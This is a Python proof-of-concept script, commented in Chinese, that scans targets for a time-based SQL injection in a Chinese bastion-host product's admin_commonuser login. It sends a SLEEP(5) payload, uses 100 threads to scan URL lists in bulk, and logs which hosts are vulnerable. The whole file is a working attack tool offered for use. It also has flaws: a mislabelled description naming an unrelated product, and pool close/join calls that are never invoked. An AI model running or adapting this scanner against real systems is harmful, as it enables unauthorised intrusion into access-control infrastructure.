#中远麒麟堡垒机sql注入漏洞
#/admin.php?controller=admin_commonuser
#/baoleiji/api/tokens
# 导包
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
# 指纹模块
def banner():
    banner = """
           ███████╗██╗  ██╗██╗   ██╗ █████╗ ██╗███╗   ██╗██╗   ██╗███████╗
            ██╔════╝██║  ██║██║   ██║██╔══██╗██║████╗  ██║╚██╗ ██╔╝██╔════╝
            ███████╗███████║██║   ██║███████║██║██╔██╗ ██║ ╚████╔╝ ███████╗
            ╚════██║██╔══██║██║   ██║██╔══██║██║██║╚██╗██║  ╚██╔╝  ╚════██║
            ███████║██║  ██║╚██████╔╝██║  ██║██║██║ ╚████║   ██║   ███████║
            ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
                                                               
                                                                    version:1.0.0
"""
    print(banner)

# poc模块
def poc(target):
    payload_url ="/admin.php?controller=admin_commonuser"
    url = target+payload_url
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Upgrade-Insecure-Requests':'1',
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    }
    headers1= {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    }
    data ="username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res1 = requests.get(target,headers=headers1,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=url,headers=headers,data=data,verify=False)
            res3 = requests.post(url=url,headers=headers,verify=False)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()
            # print(time1,time2)
            if time1 - time2 >= 5:
                print("[+]该站点存在sql延时注入漏洞,url:"+target)
                with open ('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
        else :
            print("[-]该站点不存在sql延时注入漏洞 ,url:"+target)
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")        
    except Exception as e:
        print("[!]连接出现问题，请手动进行测试该站点,url="+target)
        with open ('warning.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a Exrick XMall 开源商城 SQL注入漏洞")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()
